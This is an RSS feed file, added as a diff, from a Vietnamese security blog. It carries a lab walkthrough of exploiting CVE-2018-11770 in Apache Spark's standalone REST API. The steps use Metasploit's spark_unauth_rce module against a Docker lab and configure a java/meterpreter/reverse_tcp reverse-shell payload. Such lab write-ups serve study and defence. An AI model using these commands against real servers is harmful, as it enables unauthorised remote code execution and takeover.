@@ -1,0 +1,45 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>cve - Tag - Tu dep trai</title>
+        <link>https://g03m0n.github.io/tags/cve/</link>
+        <description>cve - Tag - Tu dep trai</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/cve/" rel="self" type="application/rss+xml" /><item>
+    <title>CVE-2018-11770</title>
+    <link>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</link>
+    <pubDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>CVE-2018-11770 được phát hiện bởi nhà nghiên cứu Trung Quốc Fengwei Zhang (Alibaba Cloud Security Team), API REST <code>CreateSubmissionRequest</code> có thể bị khai thác khi ở chế độ <code>standalone</code> cho phép hacker gửi mã độc và thực thi mã từ xa.
+Nguyên nhân xảy ra
+Từ phiên bản 1.3.0 trở đi, <code>Spark's standalone</code> master cung cấp một REST API để gửi công việc từ xa, bên cạnh việc sử dụng spark-submit. Trong chế độ <code>standalone</code>, thuộc tính cấu hình <code>spark.authenticate.secret</code> thiết lập một khóa bí mật chung để xác thực các yêu cầu gửi công việc thông qua <code>spark-submit</code>. Tuy nhiên, REST API không sử dụng cơ chế xác thực này hoặc bất kỳ cơ chế xác thực nào khác. Trong trường hợp này, bất kỳ người dùng nào cũng sẽ có thể chạy một chương trình trình điều khiển (có thể được viết bằng java, python,…) mà không cần xác thực.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng <code>CVE-2018-11770</code> sử dụng framework <code>metasploit</code>, sau đó tiến hành RCE.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh
+<code>docker-compose up</code></p>
+<p></p>
+<p><strong>Bước 2:</strong> Tiến hành khai thác bằng <code>metasploit</code> framework</p>
+<p></p>
+<p><strong>Bước 3:</strong> Sử dụng module <code>spark_unauth_rce</code> bằng câu lệnh <code>use exploit/linux/http/spark_unauth_rce</code>.</p>
+<p></p>
+<p><strong>Bước 4:</strong> Sử dụng câu lệnh <code>show options</code> chúng ta có thể thấy có rất nhiều lựa chọn</p>
+<p></p>
+<p><strong>Bước 5:</strong> Tại đây chúng ta sẽ thiết lập IP cho ``RHOST<code>, </code>LHOST` và tìm những payload phù hợp để tấn công vào máy mục tiêu:</p>
+<pre tabindex="0"><code>    set RHOSTS 192.168.1.39 
+    set RPORT 6066 
+    set LHOST 192.168.1.39
+    set LPORT 5555	
+    set payload java/meterpreter/reverse_tcp
+</code></pre><p></p>
+<p><strong>Bước 6:</strong> Các thiết lập cho việc khai thác máy mục tiêu bằng <code>metasploit</code> đã hoàn thành thực hiện câu lệnh <code>exploit</code> để khai thác.</p>
+<p></p>
+<p><strong>Bước 7:</strong> Khai thác thành công</p>
+<p></p>
+<p><strong>Bước 8:</strong> <code>Submit-job</code> thành công:</p>
+<p></p>
+<p></p>
+]]></description>
+</item>
+</channel>
+</rss>
